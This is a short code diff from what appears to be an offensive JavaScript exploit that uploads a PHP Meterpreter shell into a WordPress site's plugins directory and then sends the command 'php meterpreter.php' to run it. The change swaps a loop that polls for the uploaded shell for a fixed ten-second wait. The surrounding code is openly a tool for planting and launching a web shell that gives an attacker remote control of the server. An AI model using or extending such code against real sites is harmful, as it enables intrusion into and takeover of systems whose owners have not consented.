@@ -517,29 +517,10 @@ async function openPhpMeterpreterSession()
 
 	console.log("PHP Meterpreter shell uploaded...");
 
-    // We can't use the uploaded meterpreter shell
-    // until it's fully on the disk check to make sure it's there
-    // before executing the meterpreter shell...
-    while (true)
-	{
-		var testUri = "/wp-content/plugins/" + phpMetShellPath;
-		var xhr = new XMLHttpRequest();
-		xhr.open('GET', testUri, false);  
-		xhr.send(null);
-
-		if (xhr.status == 200) 
-		{
-  			console.log("!! Our meterpreter shell is ready!");
-  			break;
-		}
-		if (xhr.status == 404)
-		{
-			console.log("Meterpreter shell is still 404'ing...");
-			await sleep(5000);
-			continue;
-		}
-	}
-
+	// 10 seconds should be more than
+	// enough for the meterpreter shell to
+	// be there
+	await sleep(10000);
 
 	 console.log ("Sending command to execute shell...");
      commandValue = "php meterpreter.php";
